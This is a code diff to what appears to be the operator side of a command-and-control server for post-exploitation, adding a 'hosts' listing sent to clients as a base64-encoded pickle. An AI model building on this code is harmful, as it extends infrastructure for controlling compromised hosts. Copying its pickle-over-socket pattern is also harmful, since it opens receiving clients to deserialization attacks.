@@ -1,17 +1,20 @@
 import aiohttp
+import pickle
 from rich import print as rprint
+from rich.table import Table
 import threading
 from aiohttp import web
 from datetime import datetime
 import time
 import socket
 import sys
+import codecs
 
 # list of active hosts
-hosts = []
+hosts = {'555.55.555.55' : 'active'}
 
 # Holds post-exploitation commands for the target host that the operator will enter
-commands = {}
+commands = [] 
 
 # HTTP server
 
@@ -37,7 +40,24 @@ def handle_connection(conn, ip):
     while msg != 'quit' and len(msg) != 0: 
         rprint("Received_data: [green]%s" % msg)
 
-        conn.send(msg.encode())
+
+        # handle hosts command (show all hosts)
+        # TODO if host is inactive show data in red if active green
+        if msg == 'hosts':
+            table = Table(title="Hosts", show_lines=True)
+            table.add_column("IP", justify="left")
+            table.add_column("Status")
+
+            for i,j in hosts.items():
+                table.add_row(i, j)
+
+            # encodes obj to bytes to send over network
+            pickled = codecs.encode(pickle.dumps(table), "base64")
+            conn.send(pickled)
+
+        else:
+            conn.send(msg.encode())
+            
         msg = conn.recv(1024).decode()
     conn.close()
     rprint("[red]Connection Closed: %s" %str(ip))
